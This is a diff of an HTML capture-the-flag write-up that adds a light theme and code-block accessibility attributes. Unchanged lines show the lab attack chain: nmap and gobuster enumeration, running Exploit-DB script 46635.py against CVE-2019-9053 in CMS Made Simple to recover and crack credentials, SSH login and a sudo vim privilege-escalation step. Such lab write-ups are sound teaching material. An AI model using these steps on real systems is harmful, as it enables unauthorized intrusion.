@@ -26,6 +26,11 @@
       --font-display: 'Barlow Condensed', sans-serif;
       --font-mono: 'Share Tech Mono', monospace;
     }
+      [data-theme="light"] {
+        --bg: #f0f4f8; --bg2: #e2e8f0; --surface: #ffffff;
+        --border: #cbd5e1; --accent: #0077aa; --accent2: #00704a;
+        --accent3: #c22243; --text: #0f172a; --text2: #475569; --text3: #5b6b7f;
+      }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { background: var(--bg); color: var(--text); font-family: var(--font-mono); line-height: 1.8; padding: 0; }
     .wr-header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 1rem 2rem; display: flex; align-items: center; gap: 1rem; position: sticky; top: 0; z-index: 100; }
@@ -72,6 +77,7 @@
       .wr-summary-key { min-width: 0; }
     }
   </style>
+  <script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t);})()</script>
 </head>
 <body>
   <div class="wr-header">
@@ -103,7 +109,7 @@
     <div class="wr-phase">
       <h2 class="wr-phase-title">1. Enumeration &mdash; Nmap</h2>
       <p class="wr-p">A full port scan reveals three open services. Note that SSH is on the <strong>non-standard port 2222</strong> &mdash; a detail that matters later.</p>
-      <div class="wr-code">$ nmap -sC -sV -p- TARGET
+      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ nmap -sC -sV -p- TARGET
 21/tcp    open  ftp     vsftpd
 80/tcp    open  http    Apache httpd
 2222/tcp  open  ssh     OpenSSH</div>
@@ -120,7 +126,7 @@
     <div class="wr-phase">
       <h2 class="wr-phase-title">2. Web Discovery &mdash; Gobuster</h2>
       <p class="wr-p">Directory brute-forcing the web root uncovers a hidden application path.</p>
-      <div class="wr-code">$ gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt
+      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt
 /simple   (Status: 301)</div>
       <p class="wr-p">Browsing to <span class="wr-inline-code">/simple/</span> reveals the application and, critically, its version in the footer: <strong>CMS Made Simple version 2.2.8</strong>. Version disclosure is the pivot for CVE research.</p>
     </div>
@@ -128,7 +134,7 @@
     <div class="wr-phase">
       <h2 class="wr-phase-title">3. Exploitation &mdash; CVE-2019-9053</h2>
       <p class="wr-p">CMS Made Simple versions <strong>below 2.2.10</strong> are vulnerable to <span class="wr-inline-code">CVE-2019-9053</span>, a <strong>time-based blind SQL injection</strong> in the News module. Exploit-DB script <span class="wr-inline-code">46635.py</span> automates extraction of the username, password hash, and salt, then cracks the hash against a wordlist.</p>
-      <div class="wr-code">$ python 46635.py -u http://TARGET/simple --crack -w rockyou.txt
+      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ python 46635.py -u http://TARGET/simple --crack -w rockyou.txt
 
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
@@ -141,7 +147,7 @@
     <div class="wr-phase">
       <h2 class="wr-phase-title">4. Foothold &mdash; SSH on Port 2222</h2>
       <p class="wr-p">The recovered credentials are reused for SSH &mdash; remembering the non-standard port from the Nmap scan.</p>
-      <div class="wr-code">$ ssh mitch@TARGET -p 2222
+      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ ssh mitch@TARGET -p 2222
 mitch@TARGET's password: secret
 
 $ cat user.txt
@@ -151,7 +157,7 @@ G00d j0b, keep up!</div>
     <div class="wr-phase">
       <h2 class="wr-phase-title">5. Privilege Escalation &mdash; vim sudo Escape</h2>
       <p class="wr-p">Checking sudo rights shows <span class="wr-inline-code">mitch</span> can run <span class="wr-inline-code">vim</span> as root with no password. Per GTFOBins, <span class="wr-inline-code">vim</span> can spawn an interactive shell &mdash; and when launched under sudo, that shell runs as root.</p>
-      <div class="wr-code">$ sudo -l
+      <div class="wr-code" tabindex="0" role="region" aria-label="Code block">$ sudo -l
 User mitch may run the following commands:
     (root) NOPASSWD: /usr/bin/vim
 
